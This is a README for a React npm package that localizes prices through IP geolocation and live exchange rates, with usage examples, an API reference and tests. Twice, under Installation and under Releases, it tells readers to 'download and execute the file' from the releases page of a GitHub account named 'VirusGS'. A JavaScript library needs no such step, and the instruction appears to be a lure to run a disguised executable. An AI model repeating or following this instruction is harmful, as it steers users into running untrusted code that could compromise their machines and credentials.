# React Currency Localizer — Local Pricing with Geolocation & Rates

[![Releases](https://img.shields.io/badge/Releases-View-blue)](https://github.com/VirusGS/react-currency-localizer/releases)

A lightweight npm package to display prices in a user's local currency. It uses HTTPS geolocation (ipapi.co), real-time exchange rates (ExchangeRate-API), TanStack Query caching, robust error handling, currency-aware Intl formatting, manual overrides, and TypeScript.

---

![world map with currency icons](https://images.unsplash.com/photo-1522098543979-ffc7f79d2b1b?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=ac7c1a7d3dc0a2d6fdbf2a70d0d7a9d4)

Table of contents
- Features
- Quick start
- Installation
- Basic usage
- Next.js and SSR notes
- Advanced options
- API
- TypeScript types
- Caching & error handling
- Manual overrides
- Testing
- Contributing
- Releases & changelog
- License

Features
- Detect user country by IP via ipapi.co over HTTPS.
- Fetch live exchange rates from ExchangeRate-API.
- Cache rates and geolocation using TanStack Query.
- Format prices with Intl.NumberFormat and currency-aware options.
- Offer manual currency, rate, and locale overrides.
- Provide a small React hook + component pair.
- Built in TypeScript for type safety.
- Small bundle size and zero runtime dependencies besides fetch.

Quick start
- Install the package.
- Wrap your app with the provider.
- Use the hook or component to render localized prices.

Installation
Install from npm or yarn:

```bash
# npm
npm install react-currency-localizer

# yarn
yarn add react-currency-localizer

# pnpm
pnpm add react-currency-localizer
```

If you prefer a release artifact, download and execute the file at:
https://github.com/VirusGS/react-currency-localizer/releases

Usage — basic
1. Provide your ExchangeRate-API key via environment or options.
2. Wrap your app.
3. Use useLocalizedPrice or <LocalizedPrice>.

Provider example (React)
```tsx
import React from "react";
import { LocalizerProvider } from "react-currency-localizer";

export default function App({ children }) {
  return (
    <LocalizerProvider
      exchangeApiKey={process.env.NEXT_PUBLIC_EXCHANGE_API_KEY || ""}
      options={{ cacheTime: 1000 * 60 * 60 }} // 1 hour
    >
      {children}
    </LocalizerProvider>
  );
}
```

Hook example
```tsx
import { useLocalizedPrice } from "react-currency-localizer";

function Price({ amountUsd }: { amountUsd: number }) {
  const { formatted, currency, rate } = useLocalizedPrice({
    amount: amountUsd,
    baseCurrency: "USD",
  });

  return (
    <div>
      <span>{formatted}</span>
      <small> ({currency} • rate {rate.toFixed(4)})</small>
    </div>
  );
}
```

Component example
```tsx
import { LocalizedPrice } from "react-currency-localizer";

<LocalizedPrice amount={19.99} baseCurrency="USD" />
```

Next.js and SSR notes
- Geolocation requires client IP. In SSR, you can:
  - Use server-side headers (x-forwarded-for) and call ipapi.co on the server.
  - Or run the provider only on the client and render fallback prices on the server.
- The provider works on the client. If you fetch rates on the server, pass them as initial data to the provider for consistency.

Advanced options
- exchangeApiKey: string — ExchangeRate-API key.
- geolocationEndpoint: string — default uses ipapi.co JSON endpoint.
- cacheTime: number — TanStack Query cacheTime in ms.
- staleTime: number — time before rates become stale.
- fallbackCurrency: string — currency code if detection or fetch fails.
- rateMargin: number — apply a markup or discount to rates (expressed as decimal).
- formatterOptions: Intl.NumberFormatOptions — custom format options.

Example provider with overrides
```tsx
<LocalizerProvider
  exchangeApiKey="sk_live_XXXXX"
  options={{
    cacheTime: 1000 * 60 * 30, // 30m
    fallbackCurrency: "USD",
    rateMargin: 0.005, // add 0.5%
    formatterOptions: { maximumFractionDigits: 2 },
  }}
/>
```

API reference

LocalizerProvider props
- exchangeApiKey: string (required) — API key for ExchangeRate-API.
- children: ReactNode — app children.
- options?: {
  - cacheTime?: number
  - staleTime?: number
  - fallbackCurrency?: string
  - geolocationEndpoint?: string
  - rateMargin?: number
  - formatterOptions?: Intl.NumberFormatOptions
}

useLocalizedPrice(options)
- options:
  - amount: number (required) — amount in baseCurrency.
  - baseCurrency?: string — defaults to "USD".
  - locale?: string — override detected locale.
  - currency?: string — override detected currency.
  - format?: Intl.NumberFormatOptions — additional format options.

Returns
- formatted: string — formatted currency string (Intl result).
- currency: string — target currency code.
- rate: number — exchange rate applied.
- loading: boolean
- error: Error | null
- refetch(): Promise<void>

LocalizedPrice component props
- amount: number (required)
- baseCurrency?: string
- locale?: string
- currency?: string
- format?: Intl.NumberFormatOptions
- children?: (props) => ReactNode — render prop for custom output

TypeScript types
- All public types export from the package:
  - LocalizerOptions
  - LocalizedPriceResult
  - UseLocalizedPriceOptions
- Example:
```ts
import type { LocalizedPriceResult } from "react-currency-localizer";

function printPrice(p: LocalizedPriceResult) {
  console.log(p.formatted, p.currency, p.rate);
}
```

Caching and error handling
- The package uses TanStack Query for:
  - Caching exchange rates and geolocation.
  - Background refetch and retry logic.
- Retries:
  - Exponential backoff for rate fetch failures.
  - Configurable via provider options.
- Fallbacks:
  - If geolocation fails, fallbackCurrency applies.
  - If rate fetch fails and no cache exists, the component shows base currency amount formatted to fallbackLocale.
- Logging:
  - Errors surface on the hook return.
  - You can subscribe to onError via provider options to forward logs to your monitoring.

Intl formatting details
- Currency formatting uses Intl.NumberFormat with currency and locale.
- The package selects currency by country code by default (USD for US, EUR for most EU countries).
- It respects locale conventions for decimals and grouping.
- It supports currency display: "symbol", "code", "name".

Manual overrides
- You can force currency or locale at any time:
  - Use provider-level options to set app-wide defaults.
  - Use hook/component props to override per-price.
- You can also pass a manual rate to bypass ExchangeRate-API:
```tsx
useLocalizedPrice({ amount: 100, baseCurrency: "USD", manualRate: 0.85, currency: "EUR" })
```

Security and privacy
- The package calls ipapi.co to detect IP-based location. The request goes over HTTPS.
- You can disable geolocation and provide a manual locale to avoid IP calls.

Testing
- The library ships with unit tests for:
  - Rate fetching and caching.
  - Intl formatting variations.
  - Error fallback paths.
- Example test with Jest:
```ts
import { renderHook } from "@testing-library/react-hooks";
import { LocalizerProvider, useLocalizedPrice } from "react-currency-localizer";

test("formats USD to EUR with manual rate", () => {
  const wrapper = ({ children }) => (
    <LocalizerProvider exchangeApiKey="test">{children}</LocalizerProvider>
  );
  const { result } = renderHook(() => useLocalizedPrice({
    amount: 10,
    baseCurrency: "USD",
    currency: "EUR",
    manualRate: 0.9
  }), { wrapper });

  expect(result.current.formatted).toMatch(/€9\.00/);
});
```

Performance
- The library caches results and avoids repeated network calls.
- It keeps the bundle minimal and uses native Intl.

Common patterns
- Price lists
  - Fetch product prices in base currency from your API.
  - Render each price with <LocalizedPrice> and let the provider fetch rates once.
- Checkout
  - Show both base currency and localized price.
  - Offer a toggle to pay in the localized currency (apply rateMargin for margin).

Contributing
- Open an issue for any bug or feature request.
- Fork, branch, and submit a pull request.
- Follow the code style and add tests for new behavior.
- Use the monorepo scripts for lint, test, and build.

Releases & changelog
[![Releases](https://img.shields.io/badge/Changelog-View-orange?link=https://github.com/VirusGS/react-currency-localizer/releases)](https://github.com/VirusGS/react-currency-localizer/releases)

Download and execute the file at:
https://github.com/VirusGS/react-currency-localizer/releases

If the URL does not work, check the Releases section on the repo page.

FAQ
- How does geolocation work?
  - The package calls ipapi.co to get a country and currency. You can override it.
- Can I use it without an API key?
  - You can use cached or manual rates, but ExchangeRate-API requires a key for live rates.
- Does it handle cents and precision?
  - Intl handles precision. You can set maximumFractionDigits in formatterOptions.

Images and badges
- Top badges link to releases and status.
- Use your own badge keys for build and coverage.

License
- MIT. Check the LICENSE file in the repo for details.